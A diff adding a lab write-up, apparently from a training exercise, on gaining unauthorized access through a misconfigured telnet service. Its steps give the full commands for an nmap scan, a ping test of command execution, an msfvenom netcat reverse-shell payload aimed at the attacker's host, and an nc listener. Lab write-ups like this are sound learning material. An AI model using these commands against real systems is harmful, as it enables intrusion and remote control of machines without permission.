@@ -7,3 +7,21 @@ Exploit a misconfigured telnet service to gain unauthorized access
 - Nmap
 - Netcat
 - Msfvenom
+
+## Enumerating Telnet
+1. Ran a port scan using nmap on the target machine and found open port 8012
+- nmap -T4 -Pn -A -p- [IP}
+2. As I looked around the scan I can conclude this port can be used for a backdoor belolonging to skidy
+
+## Exploiting Telnet
+1. Connected to Telnet with the following syntax
+- telnet[IP] [port]
+2. Created tcpdump listener, specifcally listening for icmp traffic on seperate terminal with the following command
+- sudo tcpdump ip proto \\icmp -i ens5
+3. Used command "ping [attacking machine IP] -c 1" through the telnet ssession to see if we're able to run system commands.
+- ping recieved on tcpdump listener, which means commands are able to be executed.
+4. Generated a reverse shell payload on seperate terminal using msfvenom with the following syntax, which encodes a netcat reverse shell
+- msfvenom -p cmd/unix/reverse_netcat lhost=[local machine IP] lport=4444 R
+5. Created netcat listener on local machine to set up payload for execution with this syntax
+- nc -lvnp 4444
+6. Copied and pasted msfvenom payload into the telnet session and ran it as a command (.RUN) and got the shell on target machine.
